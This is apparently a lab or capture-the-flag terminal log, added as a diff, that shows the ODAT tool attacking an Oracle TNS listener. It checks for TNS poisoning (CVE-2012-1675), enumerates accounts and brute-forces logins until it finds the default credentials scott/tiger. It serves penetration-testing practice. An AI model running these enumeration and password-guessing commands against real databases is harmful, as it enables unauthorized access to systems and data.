@@ -1,0 +1,41 @@
+odat all -s 10.129.205.19 -p 1521 -d XE
+
+[+] Checking if target 10.129.205.19:1521 is well configured for a connection...
+[+] According to a test, the TNS listener 10.129.205.19:1521 is well configured. Continue...
+
+[1] (10.129.205.19:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
+[+] The target is vulnerable to a remote TNS poisoning
+
+[2] (10.129.205.19:1521): Searching valid accounts on the XE SID
+[!] Notice: 'ctxsys' account is locked, so skipping this username for password
+[!] Notice: 'dbsnmp' account is locked, so skipping this username for password
+[!] Notice: 'dip' account is locked, so skipping this username for password
+[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password
+[!] Notice: 'outln' account is locked, so skipping this username for password
+
+odat tnscmd -s 10.129.205.19 -p 1521 --ping
+
+[1] (10.129.205.19:1521): Searching ALIAS on the 10.129.205.19 server, port 1521
+[+] 1 ALIAS received: ['LISTENER']. You should use this alias (more or less) as Oracle SID.
+
+odat passwordguesser -s 10.129.205.19 -p 1521 -d XE --accounts-file /usr/share/odat/accounts/accounts_small.txt 2>&1 | head -100
+
+[1] (10.129.205.19:1521): Searching valid accounts on the 10.129.205.19 server, port 1521
+The login anonymous has already been tested at least once. What do you want to do:
+- stop (s/S)
+- continue and ask every time (a/A)
+- skip and continue to ask (p/P)
+- continue without to ask (c/C)
+c
+[!] Notice: 'ctxsys' account is locked, so skipping this username for password 
+[!] Notice: 'dbsnmp' account is locked, so skipping this username for password 
+[!] Notice: 'dip' account is locked, so skipping this username for password:33 
+[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password
+[!] Notice: 'outln' account is locked, so skipping this username for password7 
+[+] Valid credentials found: scott/tiger. Continue...                                 
+[!] Notice: 'xdb' account is locked, so skipping this username for password:05 
+[!] Notice: 'mdsys' account is locked, so skipping this username for password0 
+100% |########################################################| Time: 00:00:54 
+[+] Accounts found on 10.129.205.19:1521/sid:XE: 
+scott/tiger
+
